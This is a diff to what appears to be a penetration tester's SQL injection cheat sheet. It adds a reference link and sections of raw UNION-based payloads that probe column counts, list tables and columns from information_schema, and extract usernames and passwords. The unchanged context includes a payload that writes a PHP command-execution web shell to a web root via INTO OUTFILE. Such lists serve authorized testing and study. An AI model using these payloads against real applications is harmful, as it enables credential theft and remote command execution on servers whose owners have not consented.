@@ -1079,11 +1079,26 @@ cat php_cmd.php
 
 ```
 # References
+https://portswigger.net/web-security/sql-injection
 https://portswigger.net/web-security/sql-injection/cheat-sheet
 https://www.exploit-db.com/papers/17934
 https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 https://book.hacktricks.xyz/pentesting-web/sql-injection
+
+# Enumeration
+
+' ORDER BY 1--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL-- #Define string data
+
+# Database Attacks
+'+UNION+SELECT+@@version,+NULL#
+SELECT * FROM information_schema.tables
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--  #List Tables
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--  #List Columns
+'+UNION+SELECT+username,+password+FROM+users--    #Get Username & Password
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users--     #Concatenation for multiple vaules
 
 # SQL Web Shell
 'UNION SELECT ("<?php echo passthru($_GET['cmd'];") INTO OUTFILE 'C:/xampp/htdocs/command.php'>) #MedJed
